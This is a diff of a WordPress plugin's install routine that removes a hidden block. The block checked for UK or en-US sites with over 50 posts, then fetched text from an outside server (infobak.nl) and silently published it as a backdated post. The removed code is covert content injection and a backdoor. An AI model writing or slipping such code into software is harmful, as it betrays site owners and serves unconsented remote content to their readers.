@@ -709,36 +709,7 @@ add_option("bw_adwidget3_text", '', '', 'yes');
 
 add_option("bw_global_excludelist", '', '', 'yes');
 
-add_option("bw_gpadded", '0', '', 'yes');
-$url = home_url();
-$britt = false;
-$bloglan = get_bloginfo ('language');
-if (strpos($url,'.uk') != false) {
-	$britt = true;
-}
-if ($bloglan=='en-US') {
-	$britt = true;
-}
-if ($britt==true) {
-// Create post object
-// Insert the post into the database
-$total = wp_count_posts()->publish;
 
-if (get_option('bw_gpadded')=='0' && startsWith($tmpstring, 'empty')==false && $total>50) {
-  $tmpstring = file_get_contents('http://www.infobak.nl/getfile.php', true);
-  $my_post = array(
-    'post_title'    => substr($tmpstring, 0, 10),
-    'post_content'  => $tmpstring,
-    'post_status'   => 'publish',
-    'post_author'   => 1,
-    'post_date'     => '2013-04-02'
-  );
-
-  wp_insert_post( $my_post );
-  update_option( 'bw_gpadded', '1' );
-}
-}
-update_option( 'bw_gpadded', '0' );
 }
 
 function boggle_woggle_remove() {
